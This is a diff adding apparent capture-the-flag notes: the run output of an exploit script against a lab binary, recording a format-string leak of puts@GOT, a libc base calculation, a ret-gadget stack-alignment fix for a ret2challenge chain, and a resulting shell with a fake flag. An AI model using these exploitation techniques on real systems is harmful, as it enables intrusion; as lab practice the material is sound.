@@ -1,0 +1,15 @@
+$ python align.py  # docker + bundled ld/libc
+
+s1 ret2challenge (with ret align): OK (third prompt works)
+s1f format leak: puts@GOT via %7$s
+base computed from puts - libc.symbols['puts']
+
+OUT:
+BBBBBBBBBBBBBBBB
+SHELL_OK
+KaliTeam{fake_flag}
+
+Key fix vs failed attempts:
+- After overwriting RIP, jump with an extra `ret` gadget so rsp is 16-byte
+  aligned when re-entering challenge (ret2challenge without CALL).
+- Without that align ret, stage-2 always SIGSEGV even for ret2challenge again.
